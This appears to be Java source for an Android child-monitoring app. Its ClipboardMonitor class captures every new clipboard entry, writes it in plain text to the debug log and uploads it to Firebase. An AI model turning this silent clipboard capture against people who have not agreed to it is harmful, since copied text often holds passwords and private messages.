package com.childmonitorai.monitors;
import com.childmonitorai.database.DatabaseHelper;
import com.childmonitorai.models.ClipboardData;


import android.content.ClipboardManager;
import android.content.Context;
import android.text.TextUtils;
import android.util.Log;
import android.content.SharedPreferences;

public class ClipboardMonitor {
    private static final String TAG = "ClipboardMonitor";
    private Context context;
    private String userId;
    private String phoneModel;
    private ClipboardManager clipboardManager;
    private ClipboardManager.OnPrimaryClipChangedListener clipChangedListener;

    // SharedPreferences to store the last copied content
    private SharedPreferences sharedPreferences;
    private static final String PREF_NAME = "ClipboardPrefs";
    private static final String LAST_COPIED_CONTENT = "lastCopiedContent";

    public ClipboardMonitor(Context context, String userId, String phoneModel) {
        this.context = context;
        this.userId = userId;
        this.phoneModel = phoneModel;
        this.clipboardManager = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
        this.sharedPreferences = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
    }

    public void startMonitoring() {
        Log.d(TAG, "Clipboard monitoring started");

        // Listener for clipboard changes
        clipChangedListener = new ClipboardManager.OnPrimaryClipChangedListener() {
            @Override
            public void onPrimaryClipChanged() {
                if (clipboardManager.getPrimaryClip() != null) {
                    CharSequence clipboardText = clipboardManager.getPrimaryClip().getItemAt(0).getText();
                    if (clipboardText != null && clipboardText.length() > 0) {
                        String copiedText = clipboardText.toString();
                        Log.d(TAG, "Clipboard content detected: " + copiedText);

                        // Check if the content is different from the last uploaded content
                        String lastCopied = sharedPreferences.getString(LAST_COPIED_CONTENT, "");
                        if (!TextUtils.isEmpty(copiedText) && !copiedText.equals(lastCopied)) {
                            // Create a ClipboardData object
                            ClipboardData clipboardData = new ClipboardData(copiedText, System.currentTimeMillis());

                            // Upload clipboard data to Firebase
                            DatabaseHelper.uploadClipboardDataByDate(userId, phoneModel, clipboardData);

                            // Save the current clipboard content to SharedPreferences
                            SharedPreferences.Editor editor = sharedPreferences.edit();
                            editor.putString(LAST_COPIED_CONTENT, copiedText);
                            editor.apply();
                        }
                    }
                }
            }
        };

        // Register the clipboard listener
        clipboardManager.addPrimaryClipChangedListener(clipChangedListener);
    }

    public void stopMonitoring() {
        if (clipboardManager != null && clipChangedListener != null) {
            clipboardManager.removePrimaryClipChangedListener(clipChangedListener);
        }
    }
}
